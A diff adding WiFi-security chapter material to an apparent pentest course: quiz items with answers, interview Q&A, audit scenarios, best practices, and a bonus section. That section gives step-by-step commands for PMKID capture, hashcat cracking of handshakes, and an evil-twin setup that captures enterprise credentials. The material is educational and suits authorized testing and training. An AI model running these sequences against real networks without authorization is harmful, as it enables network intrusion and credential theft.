@@ -2350,6 +2350,642 @@ Before moving to Chapter 39, verify:
 - C) No authentication
 - D) Broadcasts password
 
+**Q13: Which frequency bands do WiFi networks operate on?**
+- A) 2.4GHz and 5GHz ✓
+- B) 3.5GHz and 6GHz
+- C) 900MHz and 1.8GHz
+- D) 700MHz and 2.1GHz
+
+**Q14: What is an Evil Twin attack?**
+- A) Cloning a legitimate WiFi network ✓
+- B) Jamming WiFi signals
+- C) Cracking WPA3 encryption
+- D) Brute-forcing router admin
+
+**Q15: Which tool is used for passive WiFi reconnaissance?**
+- A) aircrack-ng
+- B) airodump-ng ✓
+- C) aireplay-ng
+- D) airmon-ng
+
+---
+
+## 🎯 INTERVIEW QUESTIONS - Job Preparation
+
+### Question 1: Explain the WPA2 4-way handshake process
+**Answer:**
+The WPA2 4-way handshake is the authentication process between a client and access point:
+1. **Message 1:** AP sends ANonce (random number) to client
+2. **Message 2:** Client sends SNonce + MIC (Message Integrity Code) to AP
+3. **Message 3:** AP sends ANonce + GTK (Group Temporal Key) to client
+4. **Message 4:** Client sends acknowledgment
+
+The Pairwise Master Key (PMK) is derived from the password and SSID. The handshake generates session keys without transmitting the password.
+
+### Question 2: What is the difference between WPA2-PSK and WPA2-Enterprise?
+**Answer:**
+| Feature | WPA2-PSK | WPA2-Enterprise |
+|---------|----------|-----------------|
+| Authentication | Pre-shared key | RADIUS server |
+| Key Management | Single password | Individual credentials |
+| Scalability | Small networks | Large organizations |
+| Security | Shared key risk | Per-user keys |
+| Setup | Simple | Complex infrastructure |
+
+### Question 3: How does a deauthentication attack work?
+**Answer:**
+A deauthentication attack sends forged management frames to disconnect clients from an access point:
+- Attacker sends deauth frames with spoofed AP MAC address
+- Client receives frame and disconnects
+- When client reconnects, handshake is captured
+- Uses aireplay-ng with `-0` flag
+
+**Mitigation:** Use 802.11w (Protected Management Frames), WPA3.
+
+### Question 4: What is PMKID attack and how does it differ from traditional handshake capture?
+**Answer:**
+PMKID attack:
+- Captures PMKID from AP's first EAPOL frame
+- No client required on network
+- Faster than waiting for handshake
+- Uses hcxdumptool and hashcat
+
+Traditional handshake capture:
+- Requires client to connect
+- Must capture all 4 frames
+- Can force reconnection with deauth
+
+### Question 5: Explain the difference between monitor mode and promiscuous mode
+**Answer:**
+| Mode | Function | Use Case |
+|------|----------|----------|
+| Monitor Mode | Captures ALL wireless packets | WiFi auditing |
+| Promiscuous Mode | Captures all packets on connected network | Wired sniffing |
+
+Monitor mode operates at layer 2 (wireless), while promiscuous mode works on connected interfaces.
+
+### Question 6: What are the vulnerabilities in WEP encryption?
+**Answer:**
+WEP vulnerabilities:
+1. **Short IV (24-bit):** Repeats frequently, enabling statistical attacks
+2. **Static keys:** Key never changes during session
+3. **RC4 weaknesses:** Related-key attacks possible
+4. **No integrity check:** Bit-flipping attacks work
+
+**Attack time:** 5-30 minutes with enough captured packets.
+
+### Question 7: How does WPA3 improve security over WPA2?
+**Answer:**
+WPA3 improvements:
+1. **SAE (Simultaneous Authentication of Equals):** Replaces PSK exchange
+2. **Forward secrecy:** Compromised password doesn't reveal past sessions
+3. **Offline attack protection:** Dictionary attacks ineffective
+4. **192-bit security suite:** For enterprise deployments
+5. **Protected Management Frames:** Mandatory
+
+### Question 8: What is the KRACK attack?
+**Answer:**
+KRACK (Key Reinstallation Attack):
+- Targets WPA2 4-way handshake
+- Forces client to reinstall an already-in-use key
+- Manipulates message 3 of handshake
+- Allows decryption of packets
+- Affects all WPA2 implementations
+
+**Mitigation:** Patch clients and APs, use WPA3.
+
+### Question 9: Explain Evil Twin attack and countermeasures
+**Answer:**
+**Evil Twin Attack:**
+1. Create AP with same SSID as legitimate network
+2. Deauth clients from real AP
+3. Clients auto-connect to fake AP
+4. Capture credentials via captive portal
+
+**Countermeasures:**
+- Verify certificate on enterprise networks
+- Use WPA3 with SAE
+- Disable auto-connect to open networks
+- Check for duplicate SSIDs
+
+### Question 10: What tools are essential for WiFi security auditing?
+**Answer:**
+| Tool | Purpose |
+|------|---------|
+| aircrack-ng suite | Complete WiFi auditing |
+| wifite | Automated attacks |
+| hashcat | GPU-accelerated cracking |
+| hcxdumptool | PMKID capture |
+| reaver/bully | WPS attacks |
+| Wireshark | Packet analysis |
+| Kismet | Wireless IDS |
+
+---
+
+## 🔥 REAL-WORLD SCENARIOS
+
+### Scenario 1: Corporate WiFi Security Audit
+
+```
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                    CORPORATE WIFI SECURITY AUDIT                             ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║                                                                              ║
+║  SITUATION:                                                                  ║
+║  A company hired you to audit their WiFi security. They use WPA2-PSK        ║
+║  and have 50+ employees connecting daily.                                   ║
+║                                                                              ║
+║  APPROACH:                                                                   ║
+║  1. Scan for all networks: airodump-ng wlan0mon                             ║
+║  2. Identify target network and capture handshake                           ║
+║  3. Test password strength with wordlist attack                             ║
+║  4. Check for rogue access points                                           ║
+║  5. Verify WPS status (should be disabled)                                  ║
+║  6. Test for KRACK vulnerability                                            ║
+║  7. Document findings and provide recommendations                           ║
+║                                                                              ║
+║  FINDINGS:                                                                   ║
+║  - Weak password cracked in 2 hours                                         ║
+║  - WPS enabled on one AP                                                    ║
+║  - No PMF (Protected Management Frames)                                     ║
+║                                                                              ║
+║  RECOMMENDATIONS:                                                            ║
+║  - Upgrade to WPA2-Enterprise or WPA3                                       ║
+║  - Disable WPS on all APs                                                   ║
+║  - Use strong 15+ character passwords                                       ║
+║  - Enable PMF on all APs                                                    ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 2: Home Network Compromise Investigation
+
+```
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                    HOME NETWORK COMPROMISE INVESTIGATION                     ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║                                                                              ║
+║  SITUATION:                                                                  ║
+║  Client suspects unauthorized users on their home WiFi. Router logs         ║
+║  show unknown MAC addresses.                                                ║
+║                                                                              ║
+║  INVESTIGATION STEPS:                                                        ║
+║  1. Change router admin password immediately                                ║
+║  2. Check connected devices in router admin                                 ║
+║  3. Enable MAC filtering (temporary measure)                                ║
+║  4. Change WiFi password                                                    ║
+║  5. Check for hidden SSIDs                                                  ║
+║  6. Monitor for suspicious activity                                         ║
+║                                                                              ║
+║  DISCOVERY:                                                                  ║
+║  - Neighbor was using old password                                          ║
+║  - WPS PIN was exploited (enabled by default)                               ║
+║  - No firmware update in 2 years                                            ║
+║                                                                              ║
+║  RESOLUTION:                                                                 ║
+║  - Updated router firmware                                                  ║
+║  - Disabled WPS                                                             ║
+║  - Set strong WPA2-AES password                                             ║
+║  - Enabled logging for monitoring                                           ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 3: Public WiFi Security Assessment
+
+```
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                    PUBLIC WIFI SECURITY ASSESSMENT                           ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║                                                                              ║
+║  SITUATION:                                                                  ║
+║  Coffee shop wants to secure their public WiFi. They've had reports        ║
+║  of customers' data being stolen.                                           ║
+║                                                                              ║
+║  RISKS IDENTIFIED:                                                           ║
+║  - Open network (no encryption)                                             ║
+║  - No client isolation                                                      ║
+║  - Default admin credentials                                                ║
+║  - No traffic logging                                                       ║
+║                                                                              ║
+║  ATTACK VECTORS:                                                             ║
+║  - Man-in-the-middle attacks                                                ║
+║  - ARP poisoning                                                            ║
+║  - Packet sniffing                                                          ║
+║  - Evil twin attacks                                                        ║
+║                                                                              ║
+║  RECOMMENDATIONS:                                                            ║
+║  - Use WPA2-PSK with posted password                                        ║
+║  - Enable client isolation                                                  ║
+║  - Change default admin credentials                                         ║
+║  - Separate guest VLAN from business network                                ║
+║  - Use captive portal with TOS                                              ║
+║  - Enable logging                                                           ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 4: Penetration Testing Engagement
+
+```
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                    PENETRATION TESTING ENGAGEMENT                            ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║                                                                              ║
+║  OBJECTIVE:                                                                  ║
+║  Test WiFi security of a small business with authorization.                 ║
+║                                                                              ║
+║  METHODOLOGY:                                                                ║
+║  ┌─────────────────────────────────────────────────────────────────────┐    ║
+║  │ RECONNAISSANCE → SCANNING → EXPLOITATION → POST-EXPLOIT → REPORT   │    ║
+║  └─────────────────────────────────────────────────────────────────────┘    ║
+║                                                                              ║
+║  EXECUTION:                                                                  ║
+║  1. Recon: Identify all wireless networks (found 3 SSIDs)                   ║
+║  2. Scan: Capture packets, identify encryption types                       ║
+║  3. Target: Select corporate network (WPA2-PSK)                            ║
+║  4. Attack: Capture handshake via deauth                                    ║
+║  5. Crack: Password found in 4 hours (dictionary)                          ║
+║  6. Access: Connected to network, performed internal scan                  ║
+║                                                                              ║
+║  DELIVERABLES:                                                               ║
+║  - Executive summary                                                        ║
+║  - Technical findings                                                       ║
+║  - Risk ratings                                                             ║
+║  - Remediation steps                                                        ║
+║  - Appendix with screenshots                                                ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+```
+
+### Scenario 5: Incident Response - WiFi Breach
+
+```
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                    INCIDENT RESPONSE - WIFI BREACH                           ║
+╠══════════════════════════════════════════════════════════════════════════════╣
+║                                                                              ║
+║  INCIDENT:                                                                   ║
+║  Company detected unusual network traffic. Suspicion of WiFi breach.       ║
+║                                                                              ║
+║  RESPONSE TIMELINE:                                                          ║
+║  T+0:00  - Alert received from IDS                                          ║
+║  T+0:15  - Security team assembled                                          ║
+║  T+0:30  - WiFi logs analyzed                                               ║
+║  T+1:00  - Unauthorized device identified                                   ║
+║  T+1:30  - WiFi credentials rotated                                         ║
+║  T+2:00  - All users forced to reconnect                                    ║
+║  T+4:00  - Full network scan completed                                      ║
+║                                                                              ║
+║  ROOT CAUSE:                                                                 ║
+║  - Employee shared WiFi password externally                                 ║
+║  - No network segmentation                                                  ║
+║  - Weak password policy                                                     ║
+║                                                                              ║
+║  LESSONS LEARNED:                                                            ║
+║  - Implement WPA2-Enterprise                                                ║
+║  - Add network segmentation                                                 ║
+║  - Deploy NAC (Network Access Control)                                      ║
+║  - Regular security training                                                ║
+║                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+```
+
+---
+
+## ⚠️ SECURITY BEST PRACTICES
+
+### ✅ DO's - WiFi Security Best Practices
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                           WIFI SECURITY DO's                                 │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  ✅ ENCRYPTION & AUTHENTICATION                                             │
+│     • Use WPA3 if available, WPA2-AES minimum                              │
+│     • Implement WPA2-Enterprise for organizations                          │
+│     • Use strong passwords (15+ characters, mixed)                         │
+│     • Enable Protected Management Frames (PMF)                              │
+│                                                                              │
+│  ✅ NETWORK CONFIGURATION                                                    │
+│     • Change default SSID to something unique                              │
+│     • Change default admin credentials immediately                         │
+│     • Disable WPS completely                                                │
+│     • Use separate guest network                                           │
+│     • Enable client isolation for guest networks                           │
+│                                                                              │
+│  ✅ ROUTER SECURITY                                                          │
+│     • Update firmware regularly                                             │
+│     • Disable remote admin access from WAN                                  │
+│     • Enable firewall                                                       │
+│     • Disable UPnP if not needed                                            │
+│     • Enable logging for monitoring                                         │
+│                                                                              │
+│  ✅ MONITORING & MAINTENANCE                                                 │
+│     • Regularly check connected devices                                     │
+│     • Monitor for unusual traffic patterns                                  │
+│     • Rotate WiFi passwords periodically                                    │
+│     • Keep inventory of authorized devices                                  │
+│                                                                              │
+│  ✅ ADVANCED SECURITY                                                        │
+│     • Implement VLANs for network segmentation                             │
+│     • Use VPN for sensitive traffic                                         │
+│     • Consider RADIUS for authentication                                    │
+│     • Deploy wireless IDS/IPS                                               │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### ❌ DON'Ts - WiFi Security Mistakes to Avoid
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                          WIFI SECURITY DON'Ts                                │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  ❌ ENCRYPTION MISTAKES                                                      │
+│     • Never use WEP - completely broken                                     │
+│     • Don't use WPA-TKIP - has vulnerabilities                              │
+│     • Don't use open networks for sensitive data                            │
+│     • Don't use common/default passwords                                    │
+│                                                                              │
+│  ❌ CONFIGURATION MISTAKES                                                   │
+│     • Don't leave WPS enabled                                                │
+│     • Don't use default admin credentials                                   │
+│     • Don't broadcast SSID if hiding network (weak security)               │
+│     • Don't enable remote admin without VPN                                 │
+│                                                                              │
+│  ❌ OPERATIONAL MISTAKES                                                     │
+│     • Don't share WiFi password publicly                                     │
+│     • Don't ignore firmware updates                                         │
+│     • Don't connect to unknown/open WiFi networks                           │
+│     • Don't auto-connect to open networks                                   │
+│                                                                              │
+│  ❌ SECURITY MISCONCEPTIONS                                                  │
+│     • Hiding SSID doesn't provide real security                             │
+│     • MAC filtering is easily bypassed                                      │
+│     • HTTPS doesn't protect against all WiFi attacks                        │
+│     • Strong password isn't enough alone                                    │
+│                                                                              │
+│  ❌ TESTING MISTAKES                                                         │
+│     • Never test networks without authorization                             │
+│     • Don't perform deauth attacks on production networks                   │
+│     • Don't ignore legal requirements                                       │
+│     • Don't skip documentation                                              │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 📊 ARCHITECTURE DIAGRAMS
+
+### Diagram 1: WiFi Attack Flow
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        WIFI ATTACK METHODOLOGY                               │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   ┌──────────────┐     ┌──────────────┐     ┌──────────────┐               │
+│   │  DISCOVERY   │────►│   CAPTURE    │────►│   ATTACK     │               │
+│   └──────────────┘     └──────────────┘     └──────────────┘               │
+│          │                    │                    │                         │
+│          ▼                    ▼                    ▼                         │
+│   ┌──────────────┐     ┌──────────────┐     ┌──────────────┐               │
+│   │ • airodump   │     │ • Handshake  │     │ • Dictionary │               │
+│   │ • kismet     │     │ • PMKID      │     │ • Brute-force│               │
+│   │ • wash       │     │ • Packets    │     │ • WPS attack │               │
+│   └──────────────┘     └──────────────┘     └──────────────┘               │
+│                                                                              │
+│   ┌──────────────┐     ┌──────────────┐     ┌──────────────┐               │
+│   │  EXPLOIT     │────►│   ACCESS     │────►│   REPORT     │               │
+│   └──────────────┘     └──────────────┘     └──────────────┘               │
+│          │                    │                    │                         │
+│          ▼                    ▼                    ▼                         │
+│   ┌──────────────┐     ┌──────────────┐     ┌──────────────┐               │
+│   │ • Deauth     │     │ • Network    │     │ • Findings   │               │
+│   │ • Evil Twin  │     │ • Data       │     │ • Evidence   │               │
+│   │ • MITM       │     │ • Lateral    │     │ • Remediate  │               │
+│   └──────────────┘     └──────────────┘     └──────────────┘               │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### Diagram 2: WPA2 Handshake Attack Process
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    WPA2 HANDSHAKE ATTACK PROCESS                             │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │                         ATTACKER                                     │   │
+│   │                      (Termux/Kali)                                   │   │
+│   └────────────────────────────────┬────────────────────────────────────┘   │
+│                                    │                                         │
+│         ┌──────────────────────────┼──────────────────────────┐             │
+│         │                          │                          │             │
+│         ▼                          ▼                          ▼             │
+│   ┌───────────────┐         ┌───────────────┐         ┌───────────────┐    │
+│   │  1. MONITOR   │         │  2. CAPTURE   │         │  3. DEAUTH    │    │
+│   │     MODE      │         │   PACKETS     │         │   CLIENTS     │    │
+│   │               │         │               │         │               │    │
+│   │ airmon-ng     │         │ airodump-ng   │         │ aireplay-ng   │    │
+│   │ start wlan0   │         │ -w capture    │         │ -0 5 -a MAC   │    │
+│   └───────────────┘         └───────────────┘         └───────────────┘    │
+│                                    │                                        │
+│                                    ▼                                        │
+│                           ┌───────────────┐                                 │
+│                           │  4. HANDSHAKE │                                 │
+│                           │   CAPTURED    │                                 │
+│                           │               │                                 │
+│                           │ WPA handshake │                                 │
+│                           │ : BSSID       │                                 │
+│                           └───────────────┘                                 │
+│                                    │                                        │
+│                                    ▼                                        │
+│                           ┌───────────────┐                                 │
+│                           │  5. CRACK     │                                 │
+│                           │   PASSWORD    │                                 │
+│                           │               │                                 │
+│                           │ aircrack-ng   │                                 │
+│                           │ -w wordlist   │                                 │
+│                           └───────────────┘                                 │
+│                                    │                                        │
+│                                    ▼                                        │
+│                           ┌───────────────┐                                 │
+│                           │  ✓ ACCESS     │                                 │
+│                           │   GAINED      │                                 │
+│                           └───────────────┘                                 │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+### Diagram 3: WiFi Security Layers
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                       WIFI SECURITY LAYERS                                   │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   LAYER 4: APPLICATION                                                       │
+│   ┌───────────────────────────────────────────────────────────────────┐     │
+│   │  • VPN Tunneling  • HTTPS  • End-to-End Encryption               │     │
+│   └───────────────────────────────────────────────────────────────────┘     │
+│                                    │                                        │
+│   LAYER 3: NETWORK                                                           │
+│   ┌───────────────────────────────────────────────────────────────────┐     │
+│   │  • VLANs  • Firewall  • IDS/IPS  • NAC                           │     │
+│   └───────────────────────────────────────────────────────────────────┘     │
+│                                    │                                        │
+│   LAYER 2: AUTHENTICATION                                                    │
+│   ┌───────────────────────────────────────────────────────────────────┐     │
+│   │  • WPA3/SAE  • WPA2-Enterprise  • RADIUS  • Certificates          │     │
+│   └───────────────────────────────────────────────────────────────────┘     │
+│                                    │                                        │
+│   LAYER 1: ENCRYPTION                                                        │
+│   ┌───────────────────────────────────────────────────────────────────┐     │
+│   │  • AES-CCMP  • TKIP (deprecated)  • PMF                          │     │
+│   └───────────────────────────────────────────────────────────────────┘     │
+│                                    │                                        │
+│   LAYER 0: PHYSICAL                                                          │
+│   ┌───────────────────────────────────────────────────────────────────┐     │
+│   │  • Signal Strength  • Antenna Position  • Physical Access        │     │
+│   └───────────────────────────────────────────────────────────────────┘     │
+│                                                                              │
+│   ──────────────────────────────────────────────────────────────────────    │
+│   DEFENSE IN DEPTH: Each layer provides independent protection              │
+│   ──────────────────────────────────────────────────────────────────────    │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 🔗 RELATED CHAPTERS
+
+| Chapter | Title | Relevance |
+|---------|-------|-----------|
+| Ch30 | Security Tools Overview | Foundation for all security tools |
+| Ch31 | Hydra Password Cracking | Password cracking techniques |
+| Ch33 | John the Ripper | Advanced password cracking |
+| Ch36 | PhoneSploit & ADB | Mobile device security |
+| Ch39 | Bluetooth Security | Wireless security continuation |
+| Ch40 | Network Scanning | Network reconnaissance |
+| Ch45 | Post Exploitation | After gaining access |
+
+---
+
+## 🏆 BONUS ADVANCED CONTENT
+
+### Technique 1: PMKID Attack (No Client Required)
+
+```bash
+# PMKID attack - newer technique that doesn't require a client
+# Uses the AP's RSN IE (Robust Security Network Information Element)
+
+# Step 1: Install hcxdumptool
+pkg install hcxdumptool hcxtools
+
+# Step 2: Put interface in monitor mode
+airmon-ng start wlan0
+
+# Step 3: Capture PMKID
+hcxdumptool -o dump.pcapng -i wlan0mon --enable_status=1
+
+# Step 4: Convert to hashcat format
+hcxpcaptool -z hash.txt dump.pcapng
+
+# Step 5: Crack with hashcat
+hashcat -m 16800 hash.txt wordlist.txt
+
+# Alternative: Crack with aircrack-ng
+aircrack-ng -w wordlist.txt hash.txt
+```
+
+**Advantages:**
+- No client needed on network
+- Faster than waiting for handshake
+- Works on many modern APs
+
+### Technique 2: GPU-Accelerated Cracking
+
+```bash
+# Use hashcat with GPU for faster cracking
+
+# Step 1: Convert cap to hccapx format
+aircrack-ng -J capture capture-01.cap
+
+# Step 2: Use hashcat with GPU
+hashcat -m 2500 capture.hccapx wordlist.txt --force
+
+# Step 3: With rules for mutation
+hashcat -m 2500 capture.hccapx wordlist.txt -r rules/best64.rule
+
+# Step 4: Show cracked passwords
+hashcat -m 2500 capture.hccapx --show
+
+# Performance comparison:
+# CPU only: ~1,000-5,000 keys/sec
+# GPU: ~100,000-1,000,000+ keys/sec
+```
+
+**Hashcat Modes for WiFi:**
+- `-m 22000`: WPA-PBKDF2-PMKID+EAPOL
+- `-m 16800`: WPA-PMKID-PBKDF2
+- `-m 16801`: WPA-PMKID-PMK
+
+### Technique 3: Enterprise WiFi Security Testing
+
+```bash
+# Testing WPA2-Enterprise networks
+
+# Step 1: Identify enterprise networks
+airodump-ng wlan0mon --encrypt wpa2
+
+# Step 2: Create fake AP with same ESSID
+airbase-ng -a <BSSID> --essid "<ESSID>" -c <channel> wlan0mon
+
+# Step 3: Set up RADIUS server for credential capture
+# Use FreeRADIUS or hostapd-wpe
+
+# Step 4: Capture enterprise credentials
+# Users connecting to fake AP may submit credentials
+
+# Step 5: Use asleap for MS-CHAPv2 cracking
+asleap -C <challenge> -R <response> -W wordlist.txt
+
+# Enterprise attack tools:
+# - hostapd-wpe (Wireless Pwnage Edition)
+# - crackapd
+# - wpa_sycophant
+```
+
+**Enterprise Security Recommendations:**
+- Use certificate-based authentication (EAP-TLS)
+- Implement PEAP with valid certificates
+- Deploy NAC solutions
+- Monitor for rogue APs
+
+---
+
+## 📝 CHAPTER SUMMARY CHECKLIST
+
+- [ ] Understood WiFi security fundamentals
+- [ ] Learned encryption types (WEP, WPA, WPA2, WPA3)
+- [ ] Installed and configured aircrack-ng suite
+- [ ] Enabled monitor mode on WiFi adapter
+- [ ] Captured WPA2 handshake
+- [ ] Performed dictionary attack on handshake
+- [ ] Tested WPS vulnerability
+- [ ] Executed deauthentication attack
+- [ ] Implemented WiFi security best practices
+- [ ] Completed all practice exercises
+- [ ] Completed the interactive quiz (15 questions)
+- [ ] Attempted at least 2 advanced techniques
+
 ---
 
 ## 💡 PRO TIPS - Master WiFi Security Like a Pro!
